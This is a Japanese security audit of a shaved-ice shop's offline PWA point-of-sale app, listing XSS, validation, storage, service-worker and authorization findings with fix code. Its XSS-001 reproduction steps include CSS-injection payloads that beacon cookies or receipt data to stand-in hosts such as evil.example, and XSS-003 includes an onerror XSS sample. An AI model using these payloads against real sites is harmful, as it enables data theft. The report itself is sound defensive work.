# 朝日製氷POS — セキュリティ監査レポート

**監査者**: Bastiodon (Security)
**監査日**: 2026-04-26
**対象**: `/Volumes/Extreme SSD/自動自走エージェント/projects/kajigoria-pos/`
**対象ファイル**: index.html / app.js / style.css / sw.js / manifest.webmanifest
**システム種別**: クライアント単独完結PWA（バックエンド無し / localStorageのみ）

---

## エグゼクティブサマリ

クライアント単独・オフライン運用というアーキテクチャ上、**外部からの遠隔攻撃面はほぼゼロ**である。一方、**設定画面の保護不在**と**JSONインポート時のスキーマ検証不在**が現実的なリスクとして残る。XSS耐性は概ね良好（`innerHTML` への注入は `escapeHtml` / `escapeAttr` でカバー済み）だが、**`flavor.color` のCSS変数注入**と**ファイル名のXSS的混入**にゼロデイ的な穴が残る。

---

## 1. XSS耐性

### [Medium] XSS-001: `flavor.color` がCSS変数として未検証で `style.setProperty` に流れる
- **重要度**: Medium
- **問題**:
  app.js:209 `cell.style.setProperty('--flavor-color', f.color);`
  app.js:274 `<div class="cart-item" style="--flavor-color:${it.color}">` ← `escapeHtml` を経由していない
  `f.color` は設定画面の `<input type="color">` 由来だが、JSONインポートで任意文字列を注入可能。`url(javascript:...)` は最近のブラウザでは無効化されているが、`expression()` レガシー、属性破壊（`"; background:url('//evil.example/?'+document.cookie); --x:"`）等のCSS injectionは可能。
- **再現手順**:
  1. 設定 → JSONバックアップから復元
  2. インポートJSONの `flavors[0].color` を `red; background-image: url(http://attacker/log?d=` に書換え
  3. 復元 → カート画面を開く → 攻撃者にレシート情報がGETパラメータで送信
  なお本アプリはオフライン運用＆バックエンド無しのためデータ流出経路は限定的だが、**店舗Wi-Fiに繋がっている瞬間にビーコンが飛ぶ**可能性がある。
- **修正案**:
  ```js
  function sanitizeColor(c) {
    return /^#[0-9a-fA-F]{3,8}$/.test(String(c)) ? c : '#999999';
  }
  // 適用箇所
  cell.style.setProperty('--flavor-color', sanitizeColor(f.color));
  // テンプレート文字列も
  `<div class="cart-item" style="--flavor-color:${sanitizeColor(it.color)}">`
  ```
  さらに `addToCart` (app.js:241) で `color: sanitizeColor(f.color)` を適用すれば、カート段階でもクリーンになる。

### [Low] XSS-002: `<script>` を含む味名/トッピング名は `escapeHtml` でブロックされる（OK）
- **重要度**: Low (現状はOK)
- **問題**:
  味名 `<script>alert(1)</script>` を設定画面で入力した場合、
  - 表示側: app.js:212 / 276 / 283 / 409 / 462 / 471 すべて `escapeHtml(...)` を経由 → `&lt;script&gt;` 化されレンダリングされない。**OK**
  - 属性側: app.js:282 `data-topping="${escapeAttr(tid)}"` ← `escapeAttr` は `"` のみ。`tid` は配列キーなのでユーザー入力は混入しないが、もし将来 `tid` がユーザー由来になると `>` `<` の属性脱出が成立する。
- **修正案**:
  `escapeAttr` を `escapeHtml` 同等に強化することを推奨：
  ```js
  function escapeAttr(s) {
    return String(s).replace(/[&<>"']/g, c =>
      ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }
  ```

### [Medium] XSS-003: `escapeHtml` の対象外 — 数値型 `qty`, `tx` などが直接補間される
- **重要度**: Medium
- **問題**:
  app.js:483-489 の日別テーブルで `r.kakigori`, `r.tx`, `t.id` 由来の数値・文字列が `escapeHtml` を通らずに `<td>${c}</td>` に直挿入される。
  通常は数値だが、`importJSON()` で改ざんされたJSONを取り込むと `r.kakigori = '<img src=x onerror=alert(1)>'` のような汚染が可能。`aggregateRange` も型チェックなし（app.js:367-391）。
- **再現手順**:
  1. JSON復元で `sales[0].items[0].toppings = ['<img src=x onerror=alert(1)>']` を仕込む
  2. 売上帳 → 集計 → `t.id` ではなく `tid` 経由で `byDate[k].toppings[tid]` のキー側に汚染値が入る
  3. 日別テーブルのカラム生成時、`tid` 自体は表示されないが、`r.toppings[t.id]` の値は数値化されているのでこの経路は防げている
  - 主な脆弱経路: **数値カラムの直接補間**。今のところ `aggregateRange` 内で `+= bp` のように加算してから返すので最終的に数値化される。**現状はOK**だが、防御的コーディングのため全補間に `escapeHtml` を通すべき。
- **修正案**:
  ```js
  return `<tr>${cells.map(c => `<td>${escapeHtml(c)}</td>`).join('')}</tr>`;
  ```
  `<span class="yen">¥</span>` を含むセルは事前にHTMLビルダー化して安全マーク付与。

### [Low] XSS-004: トッピングチップのトッピング名は `escapeHtml` 済み — OK
- app.js:283 `${escapeHtml(t.name)}` 経由。**OK**

### [Info] XSS-005: スタイル注入リスク（style属性）
- インラインstyleは app.js:209, 274 のみ。前者は `style.setProperty` API（CSSパーサ経由で属性脱出は不可）、後者は文字列補間（XSS-001 で指摘済み）。
- `<input type="color">` の値はブラウザが `#rrggbb` 形式に正規化する。**設定UI経由なら安全**。JSON経由のみ要対策。

---

## 2. データ完全性

### [High] DATA-001: `saveSale` の非原子的書き込み
- **重要度**: High
- **問題**:
  app.js:88-105 `saveSale` は `loadSales()` → `push` → `setItem` の3段階。タップ連打や iOS バックグラウンド切替中にレースが発生すると、**直前の取引が消える**可能性がある。実機のlocalStorageはシングルスレッドだが、`setTimeout`/Promiseマイクロタスク間でreadとwriteが分離するため、論理的レースが起きうる。
  さらに `QuotaExceededError` 時 `throw` するが、`doCheckout` (app.js:317) は try/catch していない。**会計ボタン押下 → 例外 → トーストすら出ず → 取引消失**となる。
- **再現手順**:
  1. localStorage を 4.8MB まで埋める
  2. 会計実行
  3. `alert` は出るが `cart` はクリアされず、UIは「会計待ち」のままで、店主は再度押す → 重複試行 → ストレージ更にひっ迫
- **修正案**:
  ```js
  function doCheckout() {
    const total = calcSubtotal();
    const items = cart.map(...);
    const record = { id: ..., ts: Date.now(), items, total };
    try {
      saveSale(record);
    } catch (e) {
      alert('保存に失敗しました。設定からバックアップを取得し古いデータを削除してください。');
      return; // カートは保持。再試行可能に。
    }
    showToast(...);
    cart = [];
    document.getElementById('received').value = '';
    clearCartDraft();
    renderCart();
  }
  ```
  さらに `saveSale` を「単一record append + 別キー spillover」設計に変えれば、quota時もlast-N件は守れる。

### [High] DATA-002: `importJSON` のスキーマ検証ゼロ → ストレージ汚染
- **重要度**: High
- **問題**:
  app.js:625-649 `importJSON` は `JSON.parse` 後 `data.flavors` `data.toppings` `data.sales` の **存在確認のみ**で型・形状検証なし。
  `data.flavors = "DROP TABLE"`（文字列）でもそのまま `FLAVORS = "DROP TABLE"` に代入され、`renderFlavors()` で `FLAVORS.forEach` が `TypeError` 発生 → **アプリ全停止**。
  `data.sales = [{ts: 'evil', total: NaN}]` を入れると、売上帳が NaN 表示で破綻。
- **再現手順**:
  1. 悪意あるJSON `{"flavors": "x", "toppings": null, "sales": [{}]}` を渡す
  2. アプリが `forEach is not a function` で停止 → リロードしてもlocalStorageに保存済みなので二度と起動しない
  3. **デバッグ知識のないスタッフは詰む** → 商売停止
- **修正案**:
  ```js
  function validateImport(data) {
    const out = { flavors: null, toppings: null, sales: null };
    if (Array.isArray(data?.flavors) && data.flavors.every(f =>
      f && typeof f.name === 'string' && f.name.length <= 20 &&
      typeof f.price === 'number' && Number.isFinite(f.price) &&
      f.price >= 0 && f.price <= 100000 &&
      typeof f.color === 'string' && /^#[0-9a-fA-F]{3,8}$/.test(f.color))) {
      out.flavors = data.flavors;
    }
    if (Array.isArray(data?.toppings) && data.toppings.every(t =>
      t && typeof t.id === 'string' && /^[a-zA-Z0-9_]{1,16}$/.test(t.id) &&
      typeof t.name === 'string' && t.name.length <= 20 &&
      typeof t.price === 'number' && Number.isFinite(t.price) &&
      t.price >= 0 && t.price <= 100000)) {
      out.toppings = data.toppings;
    }
    if (Array.isArray(data?.sales) && data.sales.every(s =>
      s && typeof s.ts === 'number' && Number.isFinite(s.ts) &&
      typeof s.total === 'number' && Number.isFinite(s.total) &&
      Array.isArray(s.items))) {
      out.sales = data.sales;
    }
    return out;
  }
  // 適用
  const v = validateImport(data);
  if (!v.flavors && !v.toppings && !v.sales) {
    alert('有効なバックアップデータが含まれていません。');
    return;
  }
  if (!confirm(`復元: 品書${v.flavors? v.flavors.length:'-'} / トッピング${v.toppings? v.toppings.length:'-'} / 売上${v.sales? v.sales.length:'-'}件。よろしいですか？`)) return;
  if (v.flavors) { FLAVORS = v.flavors; saveJSON(FLAVORS_KEY, FLAVORS); }
  // ...
  ```

### [Medium] DATA-003: マイグレーション機構不在
- **重要度**: Medium
- **問題**:
  キー名に `_v1` サフィックスはあるが、 `_v2` への移行コードが無い。将来スキーマ変更時に旧データをどう扱うか未定義。スタッフは古いiPadで「v1のまま」、新iPadで「v2」を取り込む等の混乱が起きる。
- **修正案**:
  バージョン番号を data JSON にも埋め込み、 `importJSON` で旧→新変換を実装する。
  ```js
  const SCHEMA_VERSION = 1;
  // export時
  const data = { schemaVersion: SCHEMA_VERSION, ... };
  // import時
  if (data.schemaVersion > SCHEMA_VERSION) {
    alert('このアプリより新しいバックアップです。アプリを更新してください。');
    return;
  }
  // 必要なら旧→新変換
  ```

### [Medium] DATA-004: `seedIfEmpty` がアプリ起動時に毎回 `localStorage.getItem(SEEDED_KEY)` チェックのみ
- **重要度**: Medium
- **問題**:
  app.js:139-167。`SEEDED_KEY` だけが存在して `SALES_KEY` が空の場合（=スタッフが「全販売履歴を消去」を実行した直後）、サンプルが再投入されない。これは正しい動作。**ただし、Safari のプライベートブラウジング等で `localStorage.setItem` が静かに失敗** すると、毎起動でサンプル30日分（180-280件）が再生成される。`SEEDED_KEY` のsetが失敗していないか確認が必要。
- **修正案**:
  ```js
  function seedIfEmpty() {
    if (localStorage.getItem(SEEDED_KEY)) return;
    // ... 既存ロジック ...
    try {
      localStorage.setItem(SALES_KEY, JSON.stringify(out));
      localStorage.setItem(SEEDED_KEY, '1');
      // 確認
      if (localStorage.getItem(SEEDED_KEY) !== '1') {
        console.warn('localStorage write failed silently. Check Safari privacy mode.');
      }
    } catch (e) {
      // QuotaExceeded: サンプルなしで起動（実害なし）
    }
  }
  ```

---

## 3. 入力検証

### [High] INPUT-001: 価格に負数・小数・Infinity・NaNが混入
- **重要度**: High
- **問題**:
  app.js:858-866 の change handler で `parseInt(value, 10) || 0` のみ。
  - `-100` → `-100` で通る（`parseInt` は負数OK）→ **負の価格** で「会計-100円」発生
  - `Infinity` 文字列入力 → `parseInt('Infinity') = NaN → 0` で防げる
  - `1e308` → `parseInt('1e308') = 1`（OK、parseInt は指数を切る）
  - `9999999999` → そのまま通る → 計算結果が `Number.MAX_SAFE_INTEGER` 超え可能
  - 設定画面の `<input type="number">` は `min` 属性なし
- **再現手順**:
  1. 設定 → いちごの価格欄に `-250` を入力 → blur
  2. レジ画面に戻る → いちご単品で会計 → 御釣銭 `+250円` → スタッフが客に250円渡してしまう
- **修正案**:
  HTML側:
  ```html
  <input type="number" min="0" max="100000" step="1" inputmode="numeric" ...>
  ```
  JS側:
  ```js
  if (field === 'price') {
    let n = parseInt(value, 10);
    if (!Number.isFinite(n) || n < 0) n = 0;
    if (n > 100000) n = 100000;
    value = n;
  }
  ```
  `received` (お預かり) も同様に正規化必要 (app.js:309 `parseInt(...) || 0` のみ)。

### [Medium] INPUT-002: 「お預かり」入力に負数を入れると御釣銭が大きい正数になる、または `disabled` 解除条件が回避される
- **重要度**: Medium
- **問題**:
  app.js:309-314。`r = -100` の場合 `r < s` がほぼ常に真 → ボタン disabled 維持。**機能的には問題なし**だが、`<input type="number">` で `-` を入力できる UX 上の混乱がある。
  さらに `r = 1e20` のような巨大値で `r - s` がオーバーフローしないが、表示が崩壊する。
- **修正案**:
  ```html
  <input type="number" inputmode="numeric" min="0" max="100000" pattern="[0-9]*" ...>
  ```
  JS側で `Math.max(0, Math.min(100000, parseInt(...)))` を適用。

### [Medium] INPUT-003: 色入力の不正値（XSS-001 と関連）
- **重要度**: Medium（XSS-001 の修正で同時解決）
- **問題**:
  `<input type="color">` 経由ならブラウザが `#rrggbb` 強制。**JSON経由でのみ攻撃面**。XSS-001 修正の `sanitizeColor()` で全箇所を保護すること。

### [Medium] INPUT-004: 売上帳の日付ピッカーが逆順（from > to）でも集計実行
- **重要度**: Medium
- **問題**:
  app.js:440-445 `renderLedger`。`fromTs > toTs` の場合 `aggregateRange` は0件返却 → 「該当データなし」表示。**機能的には壊れない**が、ユーザーが「集計バグだ」と勘違いする。
  また `T00:00:00` / `T23:59:59` のローカルタイム解釈は iOS Safari で古いiOS（13以前）に互換性問題あり。
- **修正案**:
  ```js
  if (fromTs > toTs) {
    alert('開始日が終了日より後です。期間を確認してください。');
    return;
  }
  ```
  ISO同期化:
  ```js
  const fromTs = new Date(fromVal + 'T00:00:00').getTime();
  if (!Number.isFinite(fromTs)) return;
  ```

### [Low] INPUT-005: 未来日付を `<input type="date">` で受け入れる
- **重要度**: Low
- **問題**:
  未来日付を選んでも `aggregateRange` は0件返却で破綻しない。実害なし。
- **修正案**:
  ```html
  <input type="date" max="2099-12-31" ...>
  ```
  または JS で `Math.min(toTs, Date.now())` を適用。

### [Low] INPUT-006: カートドラフト復元時の整合性
- **重要度**: Low
- **問題**:
  app.js:121-133 `restoreCartDraft`。`d.cart` が配列であることはチェックするが、各要素の中身（`flavor`, `color`, `basePrice`, `toppings`）の型は無検証。
  - 改ざんされた cart draft `{cart: [{id:1, color:'red; eval(...)'}]}` で XSS-001 経由攻撃可能
  - 30分タイムアウトはOK
- **修正案**:
  ```js
  if (Array.isArray(d.cart)) {
    cart = d.cart.filter(it =>
      it && typeof it.id === 'number' &&
      typeof it.flavor === 'string' &&
      typeof it.basePrice === 'number' && Number.isFinite(it.basePrice) &&
      typeof it.color === 'string' && /^#[0-9a-fA-F]{3,8}$/.test(it.color) &&
      it.toppings && typeof it.toppings === 'object'
    );
  }
  ```

---

## 4. ストレージ漏洩

### [Info] STORAGE-001: localStorageに機密データなし — OK
- **重要度**: Info
- **所見**:
  保存データは「販売履歴・味設定・トッピング設定・カートドラフト・最終バックアップ日時・WakeLock設定」のみ。**個人情報（顧客名・支払方法・カード番号等）は一切なし**。GDPR/個人情報保護法の対象外。
  ただし「販売単価・売上総額・取引日時」は事業者の営業秘密に該当。**iPad盗難時の流出リスクは存在**する。
- **推奨**: iPadOS のデバイスパスコード必須化（オペレーション側で対応）

### [High] STORAGE-002: Safari「Webサイトデータ消去」「容量警告自動消去」での全データ消失
- **重要度**: High
- **問題**:
  iOS Safari は容量逼迫時 / 7日間未使用時 に localStorage を予告なく消去する（**ITP仕様**）。**PWAとしてホーム画面追加していれば回避**できるが、ブラウザタブで使い続けると蒸発する。
  さらに、店主が Safari の「履歴とWebサイトデータを消去」を意図せず実行すると、**全販売履歴が即座に消滅**。
- **再現手順**:
  1. iPad設定 → Safari → 履歴とWebサイトデータを消去
  2. アプリ再起動 → 全データ消失
- **修正案**:
  - **HTML側にホーム画面追加の必須警告を表示**（標準スタンドアロン起動でなければバナー表示）:
  ```js
  function checkStandalone() {
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches ||
                         window.navigator.standalone === true;
    if (!isStandalone) {
      // ヘッダーに警告バナー
      showToast('⚠ ホーム画面に追加してから使用してください。Safariタブのままだとデータが消える可能性があります。');
    }
  }
  ```
  - **自動バックアップ催促**: app.js:675-685 `renderBackupStatus` を強化し、3日以上未取得なら起動時にモーダルで警告:
  ```js
  function renderBackupStatus() {
    const ts = parseInt(localStorage.getItem(LAST_BACKUP_KEY) || '0', 10);
    const days = Math.floor((Date.now() - ts) / 86400000);
    if (!ts || days >= 7) {
      // 起動時モーダル + 設定画面の文字を朱色で
    }
  }
  ```
  - **理想形**: IndexedDB（より永続的）への移行 or `navigator.storage.persist()` 呼び出し:
  ```js
  if (navigator.storage && navigator.storage.persist) {
    navigator.storage.persist().then(granted => {
      if (!granted) console.warn('Persistent storage not granted');
    });
  }
  ```

### [Medium] STORAGE-003: バックアップJSONが平文（暗号化なし）
- **重要度**: Medium
- **問題**:
  app.js:604-623 `exportJSON` は `JSON.stringify(data, null, 2)` を平文Blobで保存。iCloud Driveに保存すると **Apple のサーバーに販売記録が平文で蓄積**。Apple ID 漏洩時に営業秘密が流出。
- **修正案**:
  - 軽量パスフレーズ暗号化（Web Crypto API）:
  ```js
  async function encryptBackup(json, passphrase) {
    const enc = new TextEncoder();
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const keyMaterial = await crypto.subtle.importKey(
      'raw', enc.encode(passphrase), 'PBKDF2', false, ['deriveKey']);
    const key = await crypto.subtle.deriveKey(
      {name:'PBKDF2', salt, iterations:100000, hash:'SHA-256'},
      keyMaterial, {name:'AES-GCM', length:256}, false, ['encrypt']);
    const cipher = await crypto.subtle.encrypt({name:'AES-GCM', iv}, key, enc.encode(json));
    return { salt: [...salt], iv: [...iv], cipher: [...new Uint8Array(cipher)] };
  }
  ```
  - 簡易策: ファイル名にランダムなSALTサフィックスを追加し、第三者への閲覧抑止（弱い対策）
  - 運用策: iCloud Drive ではなく**個人のローカルフォルダのみ保存**を運用ルール化

### [Low] STORAGE-004: `manifest.webmanifest` の `start_url` がクエリ無し
- 解析されない（Google Analytics等を入れない方針なら無問題）。**Info レベル**。

---

## 5. PWA固有

### [Info] PWA-001: `sw.js` の同一origin制限実装 — OK
- **所見**:
  sw.js:42 `if (url.origin !== self.location.origin) return;` で fetch interception を同一originに限定。**OK**。クロスoriginリクエストはブラウザのデフォルトに任せる正しい実装。

### [Low] PWA-002: `sw.js` の fetch.catch でindex.htmlを返す動作
- **重要度**: Low
- **問題**:
  sw.js:53 `.catch(() => caches.match('./index.html'));`
  画像リクエスト失敗時に `index.html`（HTML）が返される → ブラウザは `<img>` として解釈失敗 → 壊れた画像表示。**機能的に問題はないが、SVG画像をリクエストしてHTMLが返るとXMLパース時に予期しない挙動の可能性**。
- **修正案**:
  ```js
  }).catch(() => {
    if (req.mode === 'navigate') return caches.match('./index.html');
    return new Response('', { status: 504 });
  });
  ```

### [Medium] PWA-003: cache-first で更新が永久に届かない罠
- **重要度**: Medium
- **問題**:
  sw.js:38-56 cache-first 戦略。一度キャッシュされたファイルは VERSION が上がらない限り更新されない。
  店主が新機能を期待しても古い `index.html` が表示され続ける。`updatefound` イベント (app.js:768) は走るが、**SWの`update()`を能動的に呼ばないと検知が遅延**する。
- **修正案**:
  app.js の `registerServiceWorker` で起動時に `reg.update()` を呼ぶ:
  ```js
  navigator.serviceWorker.register('./sw.js').then((reg) => {
    reg.update();  // 追加
    setInterval(() => reg.update(), 60 * 60 * 1000); // 1h毎チェック
    // ...
  });
  ```

### [Low] PWA-004: `manifest` 過剰権限 — なし（OK）
- **所見**:
  manifest.webmanifest に `permissions` 記述なし。`display: standalone`, `orientation: landscape` は通常のPWA設定。**OK**。
  `start_url: "./index.html"`, `scope: "./"` も適切。

### [High] PWA-005: `viewport` の `user-scalable=no, maximum-scale=1.0` はWCAG 1.4.4 違反（A11y）
- **重要度**: High（A11y）/ Low（攻撃面）
- **問題**:
  index.html:6 `user-scalable=no, maximum-scale=1.0`。**視覚障害のあるスタッフがピンチズームできない**。WCAG 2.1 Level AA の達成基準1.4.4「テキストのサイズ変更」違反。
  POS固定タブレット運用なら問題は限定的だが、訴訟リスクあり。
- **修正案**:
  - WCAG準拠: `maximum-scale=2.0, user-scalable=yes` （ただしダブルタップ拡大は誤動作の温床）
  - 妥協策: スタッフ用iPadはアクセシビリティ → ズーム機能（システムレベル）で代替可能。**運用ドキュメントでカバー**。

### [Medium] PWA-006: SWキャッシュにiconファイル12個全てを `cache.addAll` 同期 — 1個欠損で全滅
- **重要度**: Medium
- **問題**:
  sw.js:23-27 `cache.addAll(PRECACHE_URLS)` は **all-or-nothing**。`./icons/icon-maskable-512.png` が存在しないと **install 失敗 → Service Worker 全機能停止**。デプロイ時のファイル抜けで全滅する。
- **再現手順**:
  1. デプロイ時に `icon-maskable-512.png` をうっかり除外
  2. PWA初回読み込み → install失敗 → 永久にOfflineで起動できない
- **修正案**:
  ```js
  self.addEventListener('install', (event) => {
    event.waitUntil(
      caches.open(CACHE).then(async (cache) => {
        // 必須リソースのみ all-or-nothing
        await cache.addAll(['./', './index.html', './app.js', './style.css', './manifest.webmanifest']);
        // アイコンは個別に try
        for (const url of [
          './icons/icon-180.png', './icons/icon-167.png', /* ... */
        ]) {
          try { await cache.add(url); } catch (e) { console.warn('icon missing:', url); }
        }
      }).then(() => self.skipWaiting())
    );
  });
  ```

---

## 6. 認可

### [Critical] AUTHZ-001: 設定画面・データ削除に保護なし — 業務停止リスク
- **重要度**: Critical（運用上）
- **問題**:
  index.html:226 `<button class="danger" data-action="clear-all-sales">全ての販売履歴を消去</button>` がノーガードでアクセス可能。
  app.js:657-662 `clearAllSales` は `confirm()` 二重だけで突破可能。**子供がiPadを触る・客が誤タップ・新人スタッフがいたずら半分でタップ → 営業データ全消失**。
  さらに app.js:543-548 `updateFlavor` は値の妥当性チェックなしで即 localStorage 書き込み。**いちごを ¥1 に変更されても気付かない**。
  二重 confirm は **タップ慣れしたスタッフは反射で「OK」を押す**ため心理的に保護にならない。
- **再現手順**:
  1. 営業中にスタッフが客に iPad を渡す（例：会計確認のため）
  2. 客が「設定」をタップ
  3. 「全ての販売履歴を消去」→ confirm 2回 → 全消失
  4. 当日売上がゼロから再開、税務申告データも消える
- **修正案**:
  - **設定画面PIN**:
    ```js
    const SETTINGS_PIN_KEY = 'asahi_seihyou_pin_v1';
    function checkSettingsPin() {
      const stored = localStorage.getItem(SETTINGS_PIN_KEY);
      if (!stored) {
        // 初回: PIN設定を強制
        const pin = prompt('設定画面用の4桁PINを設定してください（数字のみ）');
        if (!/^\d{4}$/.test(pin)) return false;
        localStorage.setItem(SETTINGS_PIN_KEY, hashPin(pin));
        return true;
      }
      const input = prompt('設定画面PIN');
      return hashPin(input) === stored;
    }
    async function hashPin(p) {
      const buf = new TextEncoder().encode('asahi-salt-' + p);
      const hash = await crypto.subtle.digest('SHA-256', buf);
      return [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2,'0')).join('');
    }
    // 設定画面遷移時にチェック
    if (action === 'go-settings') {
      if (!await checkSettingsPin()) return;
      setView('settings'); renderSettings();
    }
    ```
  - **「全消去」だけは追加で長押し3秒**:
    ```html
    <button class="danger destructive" data-action="clear-all-sales">全ての販売履歴を消去（3秒長押し）</button>
    ```
    ```js
    // 長押し検知
    let pressTimer = null;
    btn.addEventListener('touchstart', () => {
      pressTimer = setTimeout(() => clearAllSales(), 3000);
    });
    btn.addEventListener('touchend', () => clearTimeout(pressTimer));
    ```
  - **物理的緩和**: そもそも「全消去」ボタンをUIから消し、JSON復元から空配列を流し込む形にする。日常UIから破壊操作を完全排除する。

### [High] AUTHZ-002: 設定変更（価格改ざん）に履歴ログなし
- **重要度**: High
- **問題**:
  app.js:543-548。スタッフが「いちご ¥250 → ¥25」と打ち間違えても、誰がいつ変更したか記録されない。
  当日の売上が異常に少ない原因究明ができない。
- **修正案**:
  ```js
  const AUDIT_LOG_KEY = 'asahi_seihyou_audit_v1';
  function appendAudit(entry) {
    const log = JSON.parse(localStorage.getItem(AUDIT_LOG_KEY) || '[]');
    log.push({ ts: Date.now(), ...entry });
    if (log.length > 500) log.shift(); // 最新500件保持
    localStorage.setItem(AUDIT_LOG_KEY, JSON.stringify(log));
  }
  function updateFlavor(idx, field, value) {
    if (!FLAVORS[idx]) return;
    const oldValue = FLAVORS[idx][field];
    FLAVORS[idx][field] = value;
    appendAudit({ type: 'flavor_update', idx, field, old: oldValue, new: value });
    persistFlavors();
    flashRow(`tr[data-flavor-idx="${idx}"]`);
  }
  ```
  設定画面に「変更履歴を見る」セクション追加。

### [Medium] AUTHZ-003: `confirm()` ダイアログのみで破壊操作を実行
- **重要度**: Medium
- **問題**:
  app.js:557 (deleteFlavor), 586 (deleteTopping), 652 (resetSampleData), 658-659 (clearAllSales), 664 (resetSettings) すべて `confirm()` のみ。
  iOSの`confirm()`は誤タップしやすいUI。スタッフが反射的にOK連打する習慣化リスク。
- **修正案**:
  「品名を再入力」型のステップアップ確認:
  ```js
  function clearAllSales() {
    const phrase = '全消去';
    const input = prompt(`本当に削除する場合は「${phrase}」と入力してください`);
    if (input !== phrase) return;
    localStorage.setItem(SALES_KEY, '[]');
    appendAudit({ type: 'clear_all_sales' });
    showToast('販売履歴を全消去しました');
  }
  ```

---

## 7. CSP / セキュリティヘッダ

### [Medium] HEADER-001: CSPヘッダ未設定
- **重要度**: Medium
- **問題**:
  GitHub Pages や Netlify のデフォルトでは CSP ヘッダが付かない。XSS-001 / XSS-003 をbest-effort防御するため CSP は強く推奨。
- **修正案**:
  - **HTMLメタタグ方式（バックエンド不要）**:
  ```html
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    manifest-src 'self';
    worker-src 'self';
    base-uri 'self';
    form-action 'none';
    frame-ancestors 'none';
  ">
  ```
  - `style-src 'unsafe-inline'` は app.js:209, 274 のインラインstyleのため必要。XSS-001 修正後は `'unsafe-inline'` を外して `style-src 'self'` のみにできる（設計変更要）。
  - `frame-ancestors 'none'` は X-Frame-Options 相当。クリックジャッキング防止。

### [Medium] HEADER-002: 静的ホスティング先のHTTPS必須性
- **重要度**: Medium
- **問題**:
  Service Worker は `https://` または `http://localhost` でしか動作しない。**HTTP配信ではPWA機能が全停止**。
- **修正案**:
  - GitHub Pages → デフォルトHTTPS。**OK**
  - Netlify / Vercel → デフォルトHTTPS。**OK**
  - 自前S3 + CloudFront → HTTPS強制設定要
  - **絶対に `http://` で配布しない**。 `_headers` (Netlify) / `_redirects` で http→https強制:
  ```
  http://example.com/*  https://example.com/:splat  301!
  ```

### [Low] HEADER-003: その他推奨ヘッダ
- **重要度**: Low
- **修正案**（静的ホスティングの設定ファイル）:
  ```
  Strict-Transport-Security: max-age=63072000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Permissions-Policy: geolocation=(), microphone=(), camera=()
  ```

---

## 追加発見項目

### [High] EXTRA-001: `nextId` がカートドラフト復元時にコリジョン可能
- **重要度**: High
- **問題**:
  app.js:131 `if (typeof d.nextId === 'number') nextId = d.nextId;`
  ドラフトが汚染されて `nextId = 0` で復元されると、新規 `addToCart` で `id: 0` が `cart` に既に存在する場合 `toggleTopping(0, ...)` が **誤った行を更新**する。
- **修正案**:
  ```js
  if (typeof d.nextId === 'number' && Number.isFinite(d.nextId) && d.nextId > 0) {
    const maxExisting = cart.reduce((m, x) => Math.max(m, x.id || 0), 0);
    nextId = Math.max(d.nextId, maxExisting + 1);
  }
  ```

### [Medium] EXTRA-002: `showToast` の `seal-svg` template が `escapeHtml` を経由しない
- **重要度**: Medium
- **問題**:
  app.js:347 `const sealHTML = tpl ? tpl.innerHTML : '';` の後 `t.innerHTML = ...sealHTML...` で展開。
  `<template id="seal-svg">` は静的HTMLなので**現状は問題ないが**、テンプレートを動的生成する将来変更で穴が開く。
- **修正案**:
  defensiveに、template要素は `cloneNode(true)` で取得し、文字列補間を避ける:
  ```js
  if (opts.withSeal) {
    t.innerHTML = '';
    const msgSpan = document.createElement('span');
    msgSpan.className = 'toast-msg';
    msgSpan.textContent = msg;
    t.appendChild(msgSpan);
    const tpl = document.getElementById('seal-svg');
    if (tpl && tpl.content) t.appendChild(tpl.content.cloneNode(true));
  } else {
    t.innerHTML = '';
    const span = document.createElement('span');
    span.className = 'toast-msg';
    span.textContent = msg;
    t.appendChild(span);
  }
  ```

### [Medium] EXTRA-003: `format-detection` で `email=no` 等指定だが `tel:` のレシピアントは無防備
- **重要度**: Low（無問題）
- **所見**:
  index.html:27 で自動リンク化抑止 OK。**問題なし**。

### [Medium] EXTRA-004: 取引IDの衝突可能性
- **重要度**: Low
- **問題**:
  app.js:328 `id: \`${Date.now()}-${Math.random().toString(36).slice(2, 8)}\`` は1ms以内の同時会計で衝突可能（確率的に低いが、自動補充スクリプト等で問題化）。
- **修正案**:
  `crypto.randomUUID()` を使う:
  ```js
  id: typeof crypto !== 'undefined' && crypto.randomUUID
    ? crypto.randomUUID()
    : `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
  ```

---

## ブロッキング(出荷不可)指摘

1. **AUTHZ-001 (Critical)**: 設定画面・全消去ボタンが完全無防備。客の誤タップで営業データ消失。PIN保護＋長押し必須。
2. **DATA-002 (High)**: JSONインポートのスキーマ検証ゼロ。汚染JSONでアプリ全停止＆永久起動不能。`validateImport()` 実装必須。
3. **DATA-001 (High)**: `saveSale` 失敗時に `doCheckout` が try/catch せずカートが消える。例外ハンドリング必須。
4. **INPUT-001 (High)**: 価格に負数入力可能で釣銭逆流リスク。`min/max` クランプ必須。
5. **STORAGE-002 (High)**: Safari の自動データ消去で全滅。ホーム画面追加必須警告＋`navigator.storage.persist()`。

## 許容(運用注意)指摘

XSS-001（CSS変数色値）、PWA-005（ピンチズーム抑止A11y）、STORAGE-003（バックアップ平文）、AUTHZ-002（変更履歴なし）、HEADER-001（CSPメタタグ未設定）は**運用ルールと併用で当面許容可能**。次回バージョンで `sanitizeColor` / 監査ログ / CSPメタタグを順次導入。HEADER-002 のHTTPS配信は**初日から絶対遵守**。

---

## 要約（150字）

**ブロッキング**: 設定画面PIN無し（誤タップで全消去）、JSONインポート無検証で汚染→起動不能、saveSale例外でカート消失、価格負数で釣銭逆流、Safari自動消去対策不在。**許容**: CSS色値検証、ピンチズーム抑止、バックアップ平文、監査ログ、CSPメタは段階導入可。HTTPS配信のみ初日厳守。
